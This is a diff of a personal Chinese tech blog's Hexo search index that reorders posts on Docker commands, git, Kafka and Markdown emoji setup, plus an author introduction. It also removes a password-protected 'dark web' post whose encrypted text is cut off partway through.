@@ -1,11 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>docker 常用命令</title>
+    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
+    <content><![CDATA[<h2 id="docker"><a class="header-anchor" href="#docker"></a>docker</h2>
+<p>从镜像启动容器</p>
+<p>-d: 后台运行</p>
+<p>-p: 端口映射，宿主机的2020端口映射到容器的80端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 2020:80 &#123;image&#125;</span><br></pre></td></tr></table></figure>
+<p>显示所有容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls --all</span><br></pre></td></tr></table></figure>
+<p>启动/停止/重启/删除容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start&#x2F;stop&#x2F;restart&#x2F;rm 容器名或容器ID</span><br></pre></td></tr></table></figure>
+<p>重命名容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rename 原名 新名</span><br></pre></td></tr></table></figure>
+<p>进入容器内部</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &#123;容器ID&#125; bash</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git</title>
     <url>/2021/07/26/%E5%B7%A5%E5%85%B7/git/</url>
     <content><![CDATA[<h2 id="总体概览"><a class="header-anchor" href="#总体概览"></a>总体概览</h2>
 <p>与svn等集中式版本控制系统不同，git为分布式版本控制系统，每个开发者都保存整个项目的完整镜像</p>
-<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/211915189723300.jpg" alt="img"></p>
+<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/211915189723300.jpg" alt="211915189723300.jpg"></p>
 <p>工作区间: 即我们创建的工程文件， 在编辑器可直观显示；</p>
 <p>缓存区: 只能通过git GUI或git shell 窗口显示，提交代码、解决冲突的中转站；</p>
 <p>本地仓库: 只能在git shell 窗口显示，连接本地代码跟远程代码的枢纽，不能联网时本地代码可先提交至该处；</p>
@@ -88,7 +113,7 @@
 <p>下载远程分支中最新的commit并合并（不建议使用，可能出现未解决代码冲突的情况）</p>
 <h3 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h3>
 <p>在进行文件修改等操作后，使用<code>git status</code>查看状态，可以看到git给出的撤销提示</p>
-<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/.%5Cgit%5Cimage-20210708151055459.png" alt="image-20210708151055459"></p>
+<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/image-20210708151055459.png" alt="image-20210708151055459"></p>
 <p>更多参考：<a href="https://blog.csdn.net/Sweet_19BaBa/article/details/111950384">git checkout，git restore 和 git reset</a></p>
 <h4 id="版本回退"><a class="header-anchor" href="#版本回退"></a>版本回退</h4>
 <p>首先<code>git log</code>查看历史提交的版本信息</p>
@@ -111,31 +136,6 @@
       </tags>
   </entry>
   <entry>
-    <title>docker 常用命令</title>
-    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
-    <content><![CDATA[<h2 id="docker"><a class="header-anchor" href="#docker"></a>docker</h2>
-<p>从镜像启动容器</p>
-<p>-d: 后台运行</p>
-<p>-p: 端口映射，宿主机的2020端口映射到容器的80端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 2020:80 &#123;image&#125;</span><br></pre></td></tr></table></figure>
-<p>显示所有容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls --all</span><br></pre></td></tr></table></figure>
-<p>启动/停止/重启/删除容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start&#x2F;stop&#x2F;restart&#x2F;rm 容器名或容器ID</span><br></pre></td></tr></table></figure>
-<p>重命名容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rename 原名 新名</span><br></pre></td></tr></table></figure>
-<p>进入容器内部</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &#123;容器ID&#125; bash</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kafka</title>
     <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/</url>
     <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
@@ -155,36 +155,6 @@
       <tags>
         <tag>kafka</tag>
         <tag>消息队列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在Markdown中使用emoji表情</title>
-    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
-    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
-<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
-<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
-<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
-<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
-<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
-<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
-<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked -S</span><br></pre></td></tr></table></figure>
-<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-it -S</span><br></pre></td></tr></table></figure>
-<p>完成之后安装所需的插件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i markdown-it-emoji -S</span><br></pre></td></tr></table></figure>
-<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    html: true # 在 markdown 文本中支持 html tag 标签</span><br><span class="line">    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br &#x2F;&gt; 替代 &lt;br&gt;</span><br><span class="line">    breaks: true # 用 &lt;br&gt; 开始新的一行</span><br><span class="line">    linkify: true # 自动将 可能是链接的内容转换成链接</span><br><span class="line">    typographer: true # 印刷标识转换</span><br><span class="line">  plugins:</span><br><span class="line">    - markdown-it-emoji # emoji表情插件</span><br><span class="line">    - markdown-it-abbr # 可选</span><br><span class="line">    - markdown-it-footnote # 可选</span><br><span class="line">    - markdown-it-ins # 可选，</span><br><span class="line">    - markdown-it-sub # 可选，下标，如H2O</span><br><span class="line">    - markdown-it-sup # 可选，上标，如2^10</span><br><span class="line">  anchors:</span><br><span class="line">    level: 2</span><br><span class="line">    collisionSuffix: &#39;&#39;</span><br><span class="line">    permalink: false,</span><br><span class="line">    permalinkClass: &#39;header-anchor&#39;</span><br><span class="line">    permalinkSymbol: &#39;&#39;</span><br><span class="line">    case: 0</span><br><span class="line">    separator: &#39;&#39;</span><br></pre></td></tr></table></figure>
-<p>然后保存退出，再重新加载一下hexo即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Markdown</category>
-      </categories>
-      <tags>
-        <tag>Markdown</tag>
       </tags>
   </entry>
   <entry>
@@ -219,6 +189,55 @@
       <tags>
         <tag>mysql</tag>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>At the very beginning...</title>
+    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
+    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
+<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
+<p>0.有自己的博客听起来更屌一点。</p>
+<p>1.记录和分享一些学到的东西。</p>
+<p>2.倒逼自己去学一些新东西。</p>
+<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
+<p>信息安全菜鸡</p>
+<p>偶尔打打ctf找虐</p>
+<p>业余爱好拳击，徒步</p>
+<p>QQ：MTc1NTkzNjEyOQ</p>
+<p>欢迎交流 ~</p>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>在Markdown中使用emoji表情</title>
+    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
+    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
+<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
+<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
+<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
+<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
+<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked -S</span><br></pre></td></tr></table></figure>
+<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-it -S</span><br></pre></td></tr></table></figure>
+<p>完成之后安装所需的插件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i markdown-it-emoji -S</span><br></pre></td></tr></table></figure>
+<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    html: true # 在 markdown 文本中支持 html tag 标签</span><br><span class="line">    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br &#x2F;&gt; 替代 &lt;br&gt;</span><br><span class="line">    breaks: true # 用 &lt;br&gt; 开始新的一行</span><br><span class="line">    linkify: true # 自动将 可能是链接的内容转换成链接</span><br><span class="line">    typographer: true # 印刷标识转换</span><br><span class="line">  plugins:</span><br><span class="line">    - markdown-it-emoji # emoji表情插件</span><br><span class="line">    - markdown-it-abbr # 可选</span><br><span class="line">    - markdown-it-footnote # 可选</span><br><span class="line">    - markdown-it-ins # 可选，</span><br><span class="line">    - markdown-it-sub # 可选，下标，如H2O</span><br><span class="line">    - markdown-it-sup # 可选，上标，如2^10</span><br><span class="line">  anchors:</span><br><span class="line">    level: 2</span><br><span class="line">    collisionSuffix: &#39;&#39;</span><br><span class="line">    permalink: false,</span><br><span class="line">    permalinkClass: &#39;header-anchor&#39;</span><br><span class="line">    permalinkSymbol: &#39;&#39;</span><br><span class="line">    case: 0</span><br><span class="line">    separator: &#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>然后保存退出，再重新加载一下hexo即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Markdown</category>
+      </categories>
+      <tags>
+        <tag>Markdown</tag>
       </tags>
   </entry>
   <entry>
@@ -297,67 +316,7 @@
   <entry>
     <title>dark web</title>
     <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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